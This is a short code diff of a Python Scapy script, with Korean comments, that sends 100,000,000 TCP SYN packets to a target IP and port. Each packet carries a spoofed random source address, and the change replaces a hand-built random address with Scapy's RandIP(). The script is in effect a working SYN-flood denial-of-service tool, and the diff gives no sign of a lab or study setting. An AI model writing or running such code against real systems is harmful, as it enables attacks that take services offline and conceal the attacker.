@@ -17,10 +17,12 @@ l4 = TCP(dport=target_port, flags = "S")
 # 패킷을 보낼 총 횟수
 total_packets = 100000000
 
+
 # 패킷을 보내는 함수
 def send_packets():
     for i in range(total_packets):
-        temp_l3 = IP(src = str(random.randrange(1,255)) + "." + str(random.randrange(0,255)) + "." + str(random.randrange(0,255)) + "." + str(random.randrange(0,255)) ,dst=target_ip)
+        
+        temp_l3 = IP(src = RandIP() ,dst=target_ip)
         target_packet = temp_l3/l4
         send(target_packet, verbose=False)
         target_packet.show()
